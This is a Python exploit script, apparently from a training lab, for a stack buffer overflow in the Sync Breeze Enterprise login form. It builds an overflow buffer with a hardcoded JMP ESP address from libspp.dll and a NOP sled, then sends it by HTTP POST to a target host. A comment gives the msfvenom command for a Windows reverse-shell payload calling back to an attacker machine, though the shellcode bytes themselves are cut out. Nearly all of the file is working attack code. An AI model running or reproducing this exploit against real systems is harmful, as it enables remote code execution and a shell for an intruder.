#!/usr/bin/env python3
import sys
import socket
from struct import pack

OFFSET = 780
BAD_CHARS = b"\x00\x0a\x0d\x25\x26\x2b\x3d"

# msfvenom -p windows/shell_reverse_tcp LHOST=<kali_IP> LPORT=<ncat_port> EXITFUNC=thread -f python -v shellcode -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
shellcode =  b""
# ...<snip>...

# !mona jmp -r esp -cpb "\x00"
# The command finds a 9 instances that will jump to ESP
# We need one without a bad character in the address and ASLR: False.
# 0x10090c83 : jmp esp |  {PAGE_EXECUTE_READ} [libspp.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Program Files\Sync Breeze Enterprise\bin\libspp.dll)

# Exploit buffer
buf = b"A" * OFFSET
buf += pack("<I", 0x10090c83)   # "jmp esp" in libspp.dll found with mona
buf += b"C" * 4                 # Padding between EIP (780) and ESP contents (788)
buf += b"\x90" * 16             # NOPs for msfvenom payload decoding
buf += shellcode

# Optional safety check the buffer for bad characters
for c in buf:
    if c in BAD_CHARS:
        print(hex(c), 'in', buf[OFFSET:].hex())
        raise Exception("Bad character in buffer!")

body = b"username=" + buf + b"&password=A"

req = b"POST /login HTTP/1.1\r\n"
req += b"Host: 192.168.211.149\r\n"
req += b"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:45.0) Gecko/20100101 Firefox/45.0\r\n"
req += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
req += b"Accept-Language: en-US,en;q=0.5\r\n"
req += b"Referer: http://192.168.211.149/login\r\n"
req += b"Connection: close\r\n"
req += b"Content-Type: application/x-www-form-urlencoded\r\n"
req += b"Content-Length: " + str(len(body)).encode() + b"\r\n"
req += b"\r\n"
req += body

print('[+] Sending payload...')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], 80))
s.send(req)
s.close()
print('[+] Payload sent.')
